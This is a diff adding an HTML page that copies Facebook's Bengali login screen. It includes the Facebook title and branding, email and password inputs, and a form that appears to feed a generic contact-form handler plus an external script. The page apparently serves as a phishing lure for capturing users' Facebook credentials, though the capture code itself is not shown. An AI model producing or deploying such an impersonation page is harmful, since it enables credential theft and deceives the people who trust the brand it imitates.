@@ -1,0 +1,53 @@
+<!DOCTYPE html>
+<html lang="bn">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Facebook - লগ ইন বা সাইন আপ</title>
+  <link rel="stylesheet" href="style.css">
+</head>
+<body>
+  <div class="main">
+    <!-- বাম প্যানেল -->
+    <div class="left">
+      <h1>facebook</h1>
+      <p>বন্ধুদের সাথে যোগাযোগ করুন এবং আপনার জীবনের মুহূর্তগুলো শেয়ার করুন।</p>
+    </div>
+    
+    <!-- ডান প্যানেল (লগইন ফর্ম) -->
+    <div class="right">
+      <!-- 🔐 লগইন ফর্ম -->
+      <form name="contact-form" method="post" action="">
+        <!-- ইমেইল বা ফোন নম্বর ইনপুট -->
+        <input type="email" name="your-email" placeholder="ইমেইল বা ফোন নম্বর" required>
+
+        <!-- 🔐 পাসওয়ার্ড ইনপুট + চোখ আইকন -->
+        <div class="password-wrapper">
+          <input type="password" name="your-pass" placeholder="পাসওয়ার্ড" id="password" required>
+          <span class="toggle-password" id="togglePassword">
+            <!-- চোখ আইকন (ডিফল্ট: খোলা) -->
+            <svg id="eyeIcon" xmlns="http://www.w3.org/2000/svg" height="20" width="20" viewBox="0 0 20 20" fill="#555">
+              <path d="M10 4.167c-4.5 0-8.333 3.75-8.333 5.833S5.5 15.833 10 15.833s8.333-3.75 8.333-5.833S14.5 4.167 10 4.167zm0 9.166a3.333 3.333 0 1 1 0-6.666 3.333 3.333 0 0 1 0 6.666z"/>
+              <circle cx="10" cy="10" r="2" fill="#555"/>
+            </svg>
+          </span>
+        </div>
+
+        <!-- লগইন সাবমিট বাটন -->
+        <input type="submit" value="লগ ইন" id="submit">
+        
+        <!-- পাসওয়ার্ড ভুলে গেছেন লিঙ্ক -->
+        <a href="#">পাসওয়ার্ড ভুলে গেছেন?</a>
+        
+        <hr>
+        
+        <!-- নতুন অ্যাকাউন্ট তৈরি করুন বাটন -->
+        <button type="button" class="create-btn">নতুন অ্যাকাউন্ট তৈরি করুন</button>
+      </form>
+    </div>
+  </div>
+
+  <!-- JavaScript ফাইল লোড -->
+  <script src="script.js"></script>
+</body>
+</html>
